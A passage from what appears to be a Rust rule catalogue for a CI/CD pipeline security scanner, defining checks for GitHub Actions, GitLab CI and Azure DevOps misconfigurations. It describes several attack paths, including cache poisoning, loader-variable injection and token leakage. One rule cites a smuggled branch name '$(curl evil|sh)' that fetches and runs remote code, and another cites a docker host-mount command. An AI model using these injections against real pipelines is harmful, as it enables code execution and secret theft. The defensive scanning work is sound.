             check) but applied it inconsistently. The unguarded jobs hold authority that \
             fork-PR code can reach. Add the same fork-check to every privileged job in the \
             workflow.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation", "github-actions"],
    },
    RuleDef {
        id: "gitlab_deploy_job_missing_protected_branch_only",
        name: "GitlabDeployJobMissingProtectedBranchOnly",
        short_description:
            "GitLab deploy job targets a production environment but has no protected-branch restriction.",
        full_description:
            "A GitLab CI job has an `environment:` binding whose name matches a production \
             pattern (`prod`, `production`, `prd`) but no `rules:` / `only:` clause restricts \
             execution to protected branches. The job runs (or attempts to run) on every \
             pipeline trigger — every MR, every push. If branch protection is later relaxed \
             the deploy silently becomes runnable from unprotected branches. Add \
             `rules: - if: '$CI_COMMIT_REF_PROTECTED == \"true\"'`, or `only: [main]` for the \
             simplest case — both survive future changes to branch-protection settings.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "configuration", "gitlab"],
        },
        RuleDef {
        id: "terraform_output_via_setvariable_shell_expansion",
        name: "TerraformOutputViaSetvariableShellExpansion",
        short_description:
            "Terraform output captured into ##vso[task.setvariable] then expanded in a downstream shell — cross-step injection chain",
        full_description:
            "An ADO inline script (Bash@3, PowerShell@2, AzurePowerShell@5, AzureCLI@2 \
             inline, or top-level `script:`) captures a Terraform output value — either a \
             literal `terraform output` CLI invocation or a `$env:TF_OUT_*` / `$TF_OUT_*` \
             env var sourced from a `TerraformCLI@*` `command: output` task — AND emits a \
             `##vso[task.setvariable variable=NAME]VALUE` directive in the same step. A \
             subsequent step in the same job then expands `$(NAME)` in shell-expansion \
             position (`bash -c \"...\"`, `eval`, command substitution `$(...)`, PowerShell \
             `-split` / `Invoke-Command` / `Invoke-Expression` / `iex`, or as an unquoted \
             line-leading command word). The `task.setvariable` hop launders \
             attacker-controlled Terraform state — sourced from a remote backend (S3 \
             bucket, Azure Storage) whose IAM is often weaker than the pipeline's — \
             through pipeline-variable space and into a shell interpreter. Pass the value \
             via the downstream step's `env:` block (so the runtime quotes it as a shell \
             variable) and validate the shape before splitting/looping.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "azure-devops"],
    },
    RuleDef {
        id: "risky_trigger_with_authority",
        name: "RiskyTriggerWithAuthority",
        short_description:
            "High-blast-radius trigger paired with write permissions or non-default secrets.",
        full_description:
            "A workflow declares one of `issue_comment`, `pull_request_review`, \
             `pull_request_review_comment`, or `workflow_run` alongside write-grant \
             permissions or any secret other than the default `GITHUB_TOKEN`. These \
             triggers carry the same effective blast radius as `pull_request_target` \
             but slip past `trigger_context_mismatch`, exposing privileged credentials \
             to anyone with comment access on the repo or any prior-run author.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation", "github-actions"],
    },
    RuleDef {
        id: "sensitive_value_in_job_output",
        name: "SensitiveValueInJobOutput",
        short_description:
            "Job output sourced from a secret/OIDC value or a credential-shaped name.",
        full_description:
            "A `jobs.<id>.outputs.<name>` declaration sources its value from \
             `secrets.*`, an OIDC-bearing step output, or carries a credential-shaped \
             name (suffix `_token`/`_secret`/`_key`/`_pem`/`_password`/`_credential[s]`/`_api_key`). \
             Job outputs are written to the run log with only heuristic masking and \
             propagate unmasked through `needs.<job>.outputs.*` to every downstream \
             consumer — masking is never authoritative.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "manual_dispatch_input_to_url_or_command",
        name: "ManualDispatchInputToUrlOrCommand",
        short_description:
            "workflow_dispatch input flows into curl/wget/gh-api/checkout-ref — pivot to RCE.",
        full_description:
            "A `workflow_dispatch.inputs.*` value is interpolated into a command sink \
             (`curl`, `wget`, `gh api`, `gh release`, `git clone`, `git fetch`) within a \
             `run:` body, OR is used as the `ref:` for `actions/checkout`. Anyone with \
             `Actions: write` on the repository can pivot the privileged run to \
             attacker-controlled URLs/refs. Constrain the input via a `type: choice` \
             allowlist or pass values through the step's `env:` block.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "github-actions"],
    },
    RuleDef {
        id: "script_injection_via_untrusted_context",
        name: "ScriptInjectionViaUntrustedContext",
        short_description:
            "Untrusted context expression interpolated into a run/script body without env binding.",
        full_description:
            "A `run:` body or `actions/github-script` `script:` body interpolates an \
             attacker-influenced `${{ … }}` expression — `github.event.*`, `github.head_ref`, \
             or `inputs.*` from a privileged trigger — directly into the script text. The \
             value is concatenated as raw shell/JS without going through an `env:` block, \
             so a poisoned value (PR title/body, branch name) becomes arbitrary code on \
             the runner. Pass attacker-influenced values through `env:` and reference them \
             via `\"$VAR\"` (or `process.env.VAR` in github-script).",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "injection", "github-actions"],
    },
    RuleDef {
        id: "interactive_debug_action_in_authority_workflow",
        name: "InteractiveDebugActionInAuthorityWorkflow",
        short_description:
            "Interactive debug action (tmate/upterm) in a workflow holding non-default authority.",
        full_description:
            "A workflow that holds non-`GITHUB_TOKEN` secrets or non-default write \
             permissions includes a step that uses an interactive debug action \
             (`mxschmitt/action-tmate`, `lhotari/action-upterm`, `actions/tmate`, …). A \
             maintainer flipping `debug_enabled=true` publishes the runner's full \
             environment (every secret, the checked-out HEAD) over an external SSH \
             endpoint. Remove the action or restrict it to a debugging-only workflow with \
             no production secrets.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "pr_specific_cache_key_in_default_branch_consumer",
        name: "PrSpecificCacheKeyInDefaultBranchConsumer",
        short_description:
            "actions/cache key derives from PR-controlled context in a workflow that also runs on push to main.",
        full_description:
            "An `actions/cache` step keys the cache on a PR-derived expression \
             (`github.head_ref`, `github.event.pull_request.head.ref`, `github.actor`) \
             in a workflow that ALSO runs on `push: branches: [main]`. A PR can poison \
             the cache that the default-branch build later restores — the classic \
             cache-poisoning supply-chain primitive. Key the cache on stable inputs \
             (commit SHA, lockfile hash) instead of PR-controlled context.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "gh_cli_with_default_token_escalating",
        name: "GhCliWithDefaultTokenEscalating",
        short_description:
            "gh CLI with default GITHUB_TOKEN performs write-class action in PR/issue/workflow_run trigger.",
        full_description:
            "A `run:` step uses `gh` / `gh api` with the default `GITHUB_TOKEN` to \
             perform a write-class action (`pr merge`, `release create/upload`, \
             `api -X POST/PATCH/PUT/DELETE` to repository, releases, secrets, or \
             environments endpoints) inside a workflow triggered by `pull_request`, \
             `issue_comment`, or `workflow_run`. Runtime privilege escalation that \
             static permission audits miss — the token's scope at the YAML layer hides \
             the actual write surface invoked at runtime.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation", "github-actions"],
    },
    RuleDef {
        id: "gha_script_injection_to_privileged_shell",
        name: "GhaScriptInjectionToPrivilegedShell",
        short_description: "Untrusted GitHub context reaches privileged shell script.",
        full_description:
            "A run/script body interpolates attacker-controlled GitHub context directly \
             into shell or JavaScript while the job holds secrets, OIDC, or write-token \
             authority. This is the high-confidence subset of script injection leads.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "injection", "github-actions"],
    },
    RuleDef {
        id: "gha_workflow_run_artifact_poisoning_to_privileged_consumer",
        name: "GhaWorkflowRunArtifactPoisoningToPrivilegedConsumer",
        short_description: "PR artifact is interpreted by privileged workflow_run consumer.",
        full_description:
            "A workflow_run or pull_request_target consumer downloads PR-context artifact \
             content, interprets it, and holds write-token or non-default authority. This \
             is the high-confidence artifact-poisoning lane.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "artifact", "github-actions"],
    },
    RuleDef {
        id: "gha_remote_script_in_authority_job",
        name: "GhaRemoteScriptInAuthorityJob",
        short_description: "Mutable remote script executes inside authority-bearing job.",
        full_description:
            "A curl/wget/deno remote-script execution pattern pinned to mutable branch \
             content runs in a job with secrets, OIDC, cloud, registry, package, signing, \
             or write-token authority.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "gha_pat_remote_url_write",
        name: "GhaPatRemoteUrlWrite",
        short_description: "Git remote URL embeds token material during write operation.",
        full_description:
            "A GitHub Actions shell step embeds token material in a GitHub remote URL and \
             performs write-capable git operations, exposing the token through argv, logs, \
             shell history, or .git/config.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_env_credential_helper_config_redirect_before_authority",
        name: "GhaEnvCredentialHelperConfigRedirectBeforeAuthority",
        short_description:
            "Credential-helper config env is redirected before authority-bearing helpers run.",
        full_description:
            "An earlier same-job step writes credential-helper configuration environment \
             such as AWS_CONFIG_FILE, KUBECONFIG, DOCKER_CONFIG, NPM_CONFIG_USERCONFIG, \
             or GOOGLE_APPLICATION_CREDENTIALS through GITHUB_ENV before a later cloud, \
             registry, package, signing, or write-token helper boundary runs.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "credentials", "github-actions"],
    },
    RuleDef {
        id: "gha_env_node_options_code_injection_before_node_authority",
        name: "GhaEnvNodeOptionsCodeInjectionBeforeNodeAuthority",
        short_description: "NODE_OPTIONS startup injection precedes Node authority.",
        full_description:
            "An earlier same-job step writes NODE_OPTIONS startup injection flags such as \
             --require, --import, or --experimental-loader through GITHUB_ENV before a \
             later Node, npm, npx, pnpm, yarn, or JavaScript action boundary runs with \
             package, cloud, OIDC, or write-token authority.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "injection", "github-actions"],
    },
    RuleDef {
        id: "gha_env_dyld_or_ld_library_path_before_credential_helper",
        name: "GhaEnvDyldOrLdLibraryPathBeforeCredentialHelper",
        short_description: "Dynamic-loader env state precedes credential helpers.",
        full_description:
            "An earlier same-job step writes LD_PRELOAD, LD_LIBRARY_PATH, DYLD_INSERT_LIBRARIES, \
             or DYLD_LIBRARY_PATH through GITHUB_ENV before a later credential helper runs \
             with cloud, registry, package, signing, or write-token authority.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "injection", "github-actions"],
    },
    RuleDef {
        id: "gha_workflow_call_container_image_input_secrets_inherit",
        name: "GhaWorkflowCallContainerImageInputSecretsInherit",
        short_description: "Reusable workflow inherits secrets with caller-controlled image input.",
        full_description:
            "A reusable workflow call or callee allows caller-controlled container image \
             selection while secrets: inherit, OIDC, cloud, registry, package, or write-token \
             authority is available across the caller/callee boundary.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "privilege-escalation", "github-actions"],
    },
    RuleDef {
        id: "gha_workflow_call_runner_label_input_privilege_escalation",
        name: "GhaWorkflowCallRunnerLabelInputPrivilegeEscalation",
        short_description: "Reusable workflow accepts caller-controlled runner labels with authority.",
        full_description:
            "A reusable workflow call or callee allows caller-controlled runner label \
             selection while secrets, OIDC, cloud, registry, package, or write-token authority \
             is available. Dynamic runner selection can become runner-placement authority.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "privilege-escalation", "github-actions"],
    },
    RuleDef {
        id: "gha_container_image_attacker_influenced_with_secret_env",
        name: "GhaContainerImageAttackerInfluencedWithSecretEnv",
        short_description: "Authority-bearing job uses attacker-influenced container image.",
        full_description:
            "A job container image is selected from inputs, matrix, event, or needs output \
             state while secret, OIDC, registry, cloud, package, or write-token authority \
             is present in the same job.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "gha_attestation_subject_digest_from_step_output_unverified",
        name: "GhaAttestationSubjectDigestFromStepOutputUnverified",
        short_description: "Attestation signs a digest supplied by mutable workflow output state.",
        full_description:
            "An attestation action signs subject-digest from earlier step, needs, input, or \
             matrix output state while id-token: write and attestations: write authority are \
             present. The rule identifies attestation trusted-channel candidates, not confirmed \
             downstream verifier impact.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "attestation", "github-actions"],
    },
    RuleDef {
        id: "gha_attestation_subject_path_workspace_glob_with_pr_trigger",
        name: "GhaAttestationSubjectPathWorkspaceGlobWithPrTrigger",
        short_description: "PR-reachable attestation signs workspace/glob subject paths.",
        full_description:
            "A PR-capable or workflow_run workflow invokes an attestation action with a \
             workspace or glob subject-path while attestation authority is present. This \
             surfaces cases where PR-controlled workspace bytes may affect the trusted \
             attestation channel.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "attestation", "github-actions"],
    },
    RuleDef {
        id: "gha_attestation_config_driven_gate_from_workspace_file",
        name: "GhaAttestationConfigDrivenGateFromWorkspaceFile",
        short_description: "Attestation gate is driven by config or output state.",
        full_description:
            "An attestation step is gated by needs/step output state that appears to be \
             derived from config, artifact, publishing, or dist metadata while attestation \
             authority is present. Release-grade gates should come from protected event \
             state or explicit approval, not workspace-derived outputs.",
        default_level: "error",
        security_severity: "7.8",
        tags: &["security", "attestation", "github-actions"],
    },
    RuleDef {
        id: "gha_telemetry_pr_or_issue_text_to_external_sink",
        name: "GhaTelemetryPrOrIssueTextToExternalSink",
        short_description: "Untrusted PR, issue, or comment text reaches external telemetry.",
        full_description:
            "A workflow sends attacker-controlled pull-request, issue, review, commit, or \
             comment text to Slack, Discord, webhook, Sentry, Datadog, Honeycomb, or similar \
             telemetry sinks. Escape, cap, and separate this text from authority-bearing logs.",
        default_level: "warning",
        security_severity: "5.5",
        tags: &["security", "telemetry", "github-actions"],
    },
    RuleDef {
        id: "gha_telemetry_debug_flag_with_secret_env",
        name: "GhaTelemetryDebugFlagWithSecretEnv",
        short_description: "Actions debug logging is enabled while secrets are present.",
        full_description:
            "A job enables ACTIONS_STEP_DEBUG or ACTIONS_RUNNER_DEBUG while secret, token, \
             OIDC, cloud, registry, package, or signing authority is present. Debug telemetry \
             can widen exposure through logs and retained artifacts.",
        default_level: "error",
        security_severity: "7.0",
        tags: &["security", "telemetry", "github-actions"],
    },
    RuleDef {
        id: "gha_telemetry_autonomous_agent_input_from_untrusted_event",
        name: "GhaTelemetryAutonomousAgentInputFromUntrustedEvent",
        short_description: "Autonomous agent receives untrusted event text with write authority nearby.",
        full_description:
            "An autonomous coding or repair agent receives PR, issue, comment, or workflow_run \
             context while write-class tools, tokens, or later git/API mutation are available. \
             Split analysis from mutation and gate write tools explicitly.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "autonomous-agent", "github-actions"],
    },
    RuleDef {
        id: "gha_workflow_run_artifact_to_blob_storage_token",
        name: "GhaWorkflowRunArtifactToBlobStorageToken",
        short_description: "workflow_run artifact is uploaded to blob/object storage with authority.",
        full_description:
            "A workflow_run or pull_request_target consumer downloads artifact content and \
             uploads it to blob, object, or release storage while write-token or deploy authority \
             is available. Treat upstream artifacts as untrusted until rebuilt or provenance-checked.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "artifact", "github-actions"],
    },
    RuleDef {
        id: "gha_api_workflow_run_artifact_to_autonomous_agent_to_git_push",
        name: "GhaApiWorkflowRunArtifactToAutonomousAgentToGitPush",
        short_description: "workflow_run artifact reaches autonomous agent before git/API mutation.",
        full_description:
            "A workflow_run or pull_request_target consumer downloads lower-trust artifact data, \
             feeds or colocates it with an autonomous agent, then performs git or GitHub API \
             mutation under write authority in the same job.",
        default_level: "error",
        security_severity: "8.5",
        tags: &["security", "artifact", "autonomous-agent", "github-actions"],
    },
    RuleDef {
        id: "gha_manifest_npm_lifecycle_hook_pr_trigger_with_token",
        name: "GhaManifestNpmLifecycleHookPrTriggerWithToken",
        short_description: "PR-reachable npm-family install runs lifecycle hooks with authority.",
        full_description:
            "A pull_request or pull_request_target workflow invokes npm, pnpm, or yarn \
             install commands without --ignore-scripts while secrets, OIDC, registry/cloud \
             credentials, or write-token authority are present in the same job.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "manifest-as-code", "npm", "github-actions"],
    },
    RuleDef {
        id: "gha_manifest_python_m_build_with_pr_credentials",
        name: "GhaManifestPythonMBuildWithPrCredentials",
        short_description: "PR-reachable Python build/install runs with publish authority.",
        full_description:
            "A PR-reachable workflow invokes Python build, setup.py, pip install, wheel, \
             cibuildwheel, maturin, pdm, or poetry build paths while publish credentials, \
             OIDC, or write-token authority are available. Build artifacts should be \
             produced without publish authority and rebuilt or verified before release.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "manifest-as-code", "python", "github-actions"],
    },
    RuleDef {
        id: "gha_manifest_cargo_build_rs_pull_request_with_token",
        name: "GhaManifestCargoBuildRsPullRequestWithToken",
        short_description: "PR-reachable Cargo build/test can run build.rs with authority.",
        full_description:
            "A pull_request or pull_request_target workflow invokes Cargo compile paths \
             while secrets, OIDC, registry/cloud credentials, or write-token authority are \
             present. Cargo build.rs, build-dependencies, and proc-macros are executable \
             manifest-controlled code.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "manifest-as-code", "rust", "github-actions"],
    },
    RuleDef {
        id: "gha_manifest_makefile_with_pr_trigger_and_secrets",
        name: "GhaManifestMakefileWithPrTriggerAndSecrets",
        short_description: "PR/workflow_run-reachable make runs with secret authority.",
        full_description:
            "A pull_request, pull_request_target, workflow_run, or issue_comment workflow \
             invokes make/gmake/bmake while secrets, OIDC, registry/cloud credentials, or \
             write-token authority are present. Makefile recipes are workspace-controlled \
             shell and should run without authority unless protected and verified.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "manifest-as-code", "make", "github-actions"],
    },
    RuleDef {
        id: "gha_manifest_submodules_recursive_with_pr_authority",
        name: "GhaManifestSubmodulesRecursiveWithPrAuthority",
        short_description: "Recursive submodule checkout runs in PR-reachable authority job.",
        full_description:
            "A PR/workflow_run-reachable job invokes actions/checkout with submodules: \
             true or recursive while authority is present. PR-mutable .gitmodules can \
             redirect workspace content unless URLs and SHAs are allowlisted.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "manifest-as-code", "git", "github-actions"],
    },
    RuleDef {
        id: "gha_crossrepo_workflow_call_floating_ref_cascade",
        name: "GhaCrossrepoWorkflowCallFloatingRefCascade",
        short_description: "Cross-repo reusable workflow call uses a mutable ref.",
        full_description:
            "A reusable workflow call uses org/repo/.github/workflows/file.yml@main, \
             @master, @HEAD, or a floating major tag. The producer repo's branch \
             protection becomes the effective security boundary for the consumer workflow.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "manifest-as-code", "workflow-call", "github-actions"],
    },
    RuleDef {
        id: "gha_crossrepo_secrets_inherit_unreviewed_callee",
        name: "GhaCrossrepoSecretsInheritUnreviewedCallee",
        short_description: "Cross-repo reusable workflow inherits all caller secrets.",
        full_description:
            "A reusable workflow call forwards secrets: inherit to a cross-repo callee. \
             Replace it with an explicit named secret map and pin/audit the callee before \
             forwarding deploy, package, cloud, signing, or registry authority.",
        default_level: "error",
        security_severity: "8.0",
        tags: &["security", "manifest-as-code", "workflow-call", "github-actions"],
    },
    RuleDef {
        id: "gha_issue_comment_command_to_write_token",
        name: "GhaIssueCommentCommandToWriteToken",
        short_description: "Issue comment input reaches write-token command sink.",
        full_description:
            "An issue_comment workflow reads comment or issue-controlled input near gh, \
             git, dispatch, or API mutation sinks while write-token authority is present.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation", "github-actions"],
    },
    RuleDef {
        id: "gha_pr_build_pushes_publishable_image",
        name: "GhaPrBuildPushesPublishableImage",
        short_description: "PR-triggered build pushes image with publish authority.",
        full_description:
            "A pull_request or pull_request_target workflow builds and pushes a container \
             image while registry or cloud publish authority is present. This is the \
             publishable-image subset of PR image build leads.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "gha_manual_dispatch_ref_to_privileged_checkout",
        name: "GhaManualDispatchRefToPrivilegedCheckout",
        short_description: "workflow_dispatch input controls privileged checkout ref.",
        full_description:
            "A workflow_dispatch input controls actions/checkout ref in a job that holds \
             write-token, secret, OIDC, or deploy authority. Dispatch permission becomes \
             code-selection authority on a privileged runner.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "github-actions"],
    },
    RuleDef {
        id: "ci_job_token_to_external_api",
        name: "CiJobTokenToExternalApi",
        short_description:
            "GitLab `$CI_JOB_TOKEN` used as a bearer credential against an HTTP endpoint or `docker login`",
        full_description:
            "A GitLab CI job uses `$CI_JOB_TOKEN` (or `gitlab-ci-token:$CI_JOB_TOKEN`) as a \
             bearer credential — passed to `curl`/`wget` against `${CI_API_V4_URL}/projects/...`, \
             handed to `docker login registry.gitlab.com`, or sent as a `JOB-TOKEN:` / \
             `Authorization:` header. CI_JOB_TOKEN's default scope is broad (container-registry \
             write to the caller's project, Helm/Generic Package upload, project read), so a \
             poisoned MR job that emits the token to an attacker-controlled endpoint can pivot \
             to package or registry pushes. Scope the token under Settings → CI/CD → Job token \
             permissions and prefer dedicated short-lived deploy tokens for uploads.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "gitlab-ci"],
    },
    RuleDef {
        id: "id_token_audience_overscoped",
        name: "IdTokenAudienceOverscoped",
        short_description:
            "GitLab `id_tokens:` audience is wildcard or shared between MR-context and protected jobs",
        full_description:
            "A GitLab CI `id_tokens:` declares an `aud:` value that is either a wildcard / \
             catch-all string OR is reused across `merge_request_event` jobs and \
             protected-branch jobs in the same file. The audience is what trades for \
             downstream cloud / Vault credentials — when the same audience is reachable from \
             both untrusted (MR) and privileged (protected-branch) jobs, a poisoned MR can \
             mint a token that the downstream IdP will exchange for the same role the \
             production deploy uses. Bind each downstream role / Vault path to a unique \
             audience derived from the trust context of the consuming job.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation", "gitlab-ci"],
    },
    RuleDef {
        id: "untrusted_ci_var_in_shell_interpolation",
        name: "UntrustedCiVarInShellInterpolation",
        short_description:
            "Attacker-controlled GitLab predefined var interpolated unquoted into shell or environment.url",
        full_description:
            "A GitLab CI step interpolates an attacker-controlled predefined variable \
             (`$CI_COMMIT_BRANCH`, `$CI_COMMIT_REF_NAME`, `$CI_COMMIT_TAG`, \
             `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_TITLE`, `$CI_COMMIT_DESCRIPTION`, \
             `$CI_COMMIT_AUTHOR`, `$CI_MERGE_REQUEST_TITLE`, \
             `$CI_MERGE_REQUEST_DESCRIPTION`, `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`) \
             into `script:` / `before_script:` / `after_script:` or into \
             `environment:url:` without single-quote isolation or `printf %q` \
             sanitisation. A branch named `` $(curl evil|sh) `` or an MR title containing \
             backticks executes inside the runner with the job's full authority — the \
             GitLab generalisation of the GitHub Actions `script-injection` class. Pass \
             the value through the step's `variables:` block and reference it as a quoted \
             shell variable, or use the pre-sanitised `$CI_COMMIT_REF_SLUG` for URL \
             contexts.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "gitlab-ci"],
    },
    RuleDef {
        id: "unpinned_include_remote_or_branch_ref",
        name: "UnpinnedIncludeRemoteOrBranchRef",
        short_description:
            "GitLab include: references a mutable branch (remote raw, project ref, or no ref).",
        full_description:
            "A GitLab CI `include:` references either (a) a `remote:` URL pointing at a \
             branch (`/-/raw/<branch>/...`), (b) a `project:` whose `ref:` resolves to a \
             mutable branch, or (c) an include with no `ref:` (defaults to HEAD). Whoever \
             owns that branch can backdoor every consumer's pipeline silently — included \
             YAML executes with the consumer's secrets and CI_JOB_TOKEN. Pin every \
             include to a tag or commit SHA.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "gitlab-ci"],
    },
    RuleDef {
        id: "dind_service_grants_host_authority",
        name: "DindServiceGrantsHostAuthority",
        short_description:
            "GitLab job runs docker-in-docker AND holds a non-default secret — host filesystem reachable.",
        full_description:
            "A GitLab job declares a `services: [docker:*-dind]` sidecar AND holds at \
             least one non-CI_JOB_TOKEN secret. docker-in-docker exposes the full Docker \
             socket inside the job container — a malicious build step can `docker run -v \
             /:/host` from inside dind and read the runner host filesystem (other jobs' \
             artifacts, cached creds). Use rootless buildah/buildkit or split secret \
             handling into a separate job that does not enable dind.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "isolation", "gitlab-ci"],
    },
    RuleDef {
        id: "security_job_silently_skipped",
        name: "SecurityJobSilentlySkipped",
        short_description:
            "Scanner job (sast/dast/secret_detection/etc) runs with allow_failure: true and no surfacing rule.",
        full_description:
            "A GitLab job whose name or `extends:` matches scanner patterns (`sast`, \
             `dast`, `secret_detection`, `dependency_scanning`, `container_scanning`, \
             `gitleaks`, `trivy`, `grype`, `semgrep`, …) runs with `allow_failure: true` \
             AND has no `rules:` clause that surfaces the failure. The pipeline goes \
             green even when the scan errors out — silent-pass is worse than no scan \
             because reviewers trust the badge. Drop `allow_failure:` or guard it with \
             a `rules: when: manual` that requires explicit override.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "supply-chain", "gitlab-ci"],
    },
    RuleDef {
        id: "child_pipeline_trigger_inherits_authority",
        name: "ChildPipelineTriggerInheritsAuthority",
        short_description:
            "GitLab trigger: job runs in MR context OR uses dynamic include:artifact: — code-injection sink.",
        full_description:
            "A GitLab `trigger:` job (downstream / child pipeline) runs in \
             `merge_request_event` context OR uses `include: artifact:` from a previous \
             job (dynamic child pipeline). Dynamic child pipelines are a code-injection \
             sink — anything the build step writes to the artifact runs as a real \
             pipeline with the parent project's secrets. Restrict `trigger:` jobs to \
             protected-branch contexts and prefer static `include:local:` over dynamic \
             artifact-based includes.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation", "gitlab-ci"],
    },
    RuleDef {
        id: "cache_key_crosses_trust_boundary",
        name: "CacheKeyCrossesTrustBoundary",
        short_description:
            "GitLab cache key is hardcoded or shared between MR and protected jobs without policy: pull.",
        full_description:
            "A GitLab `cache:` declaration whose `key:` is hardcoded, `$CI_JOB_NAME` \
             only, or `$CI_COMMIT_REF_SLUG` without a `policy: pull` restriction. \
             Caches are stored per-runner keyed by `key:`; a poisoned MR can push a \
             malicious `node_modules/` cache that the next default-branch job downloads \
             and executes during `npm install`. Key the cache on `$CI_COMMIT_SHA` plus a \
             lockfile hash, or set `policy: pull` on jobs that should never write the \
             cache.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "gitlab-ci"],
    },
    RuleDef {
        id: "pat_embedded_in_git_remote_url",
        name: "PatEmbeddedInGitRemoteUrl",
        short_description:
            "CI script embeds a credential variable inside a git remote URL (https://user:$TOKEN@host)",
        full_description:
            "A CI `script:` body constructs an HTTPS git URL with a credential-shaped \
             variable embedded directly in the URL (e.g. \
             `git remote set-url origin https://user:${PAT_TOKEN}@gitlab.com/org/repo.git`). \
             Once git executes against that URL the token's resolved value is visible in \
             the process argv (`ps`, `/proc/*/cmdline`), persists in `.git/config` for \
             the rest of the job (where any subsequent step can read it), and lands in \
             `GIT_TRACE` output if enabled. Switch to a credential helper or pass the \
             token via `http.extraHeader` so it never enters argv or on-disk config.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "gitlab"],
    },
    RuleDef {
        id: "ci_token_triggers_downstream_with_variable_passthrough",
        name: "CiTokenTriggersDownstreamWithVariablePassthrough",
        short_description:
            "CI_JOB_TOKEN-driven cross-project pipeline trigger forwards `variables[…]` to the downstream pipeline",
        full_description:
            "A CI script invokes the GitLab REST API \
             (`POST /api/v4/projects/:id/trigger/pipeline`) with `CI_JOB_TOKEN` and \
             forwards user-influenced values via `variables[KEY]=...` query/form fields. \
             The downstream project receives those variables in its pipeline scope — a \
             cross-project authority bridge that bypasses the `trigger:`-keyword \
             parent-child trust model. When the upstream job runs on merge-request \
             pipelines the variable values may originate from attacker-controlled \
             context. Prefer the `trigger:` keyword with `strategy: depend` and \
             constrain which variables the downstream pipeline accepts.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "propagation", "gitlab"],
    },
    RuleDef {
        id: "dotenv_artifact_flows_to_privileged_deployment",
        name: "DotenvArtifactFlowsToPrivilegedDeployment",
        short_description:
            "GitLab dotenv artifact flows to a downstream deployment job with a production-like environment",
        full_description:
            "A GitLab job declares `artifacts.reports.dotenv: <file>`. The file's \
             `KEY=value` lines are silently promoted to pipeline variables for any \
             consumer linked via `needs:` or `dependencies:` — there is no explicit \
             download visible at the job level. When a consumer in a later stage \
             targets a production-like environment (`prod`, `production`, `prd`, \
             `live`), or when the producer's script reads attacker-influenced inputs \
             (`CI_COMMIT_REF_NAME`, `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, \
             `CI_COMMIT_TAG`), the dotenv flow is a covert privilege-escalation \
             channel. Validate dotenv-promoted values in the consumer before use, or \
             prefer pipeline-scoped variables for deployment selection.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "propagation", "gitlab"],
    },
    RuleDef {
        id: "setvariable_issecret_false",
        name: "SetvariableIssecretFalse",
        short_description:
            "ADO inline script sets a sensitive pipeline variable without issecret=true.",
        full_description:
            "An ADO inline script emits `##vso[task.setvariable variable=<NAME>]` for a \
             sensitive-named variable without setting `issecret=true`. Without the flag, the \
             variable value is printed in plaintext to the pipeline log and is not masked in \
             downstream step output.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "homoglyph_in_action_ref",
        name: "HomoglyphInActionRef",
        short_description:
            "Action reference contains non-ASCII characters (possible Unicode homoglyph / confusable).",
        full_description:
            "A GitHub Actions `uses:` field contains one or more non-ASCII characters. \
             Legitimate action references are purely ASCII (`owner/repo@ref`). Non-ASCII \
             characters in this position indicate a possible Unicode confusable / homoglyph \
             attack: an attacker registers an action whose name visually impersonates a \
             trusted one by substituting look-alike characters (e.g. Cyrillic `\u{0430}` for \
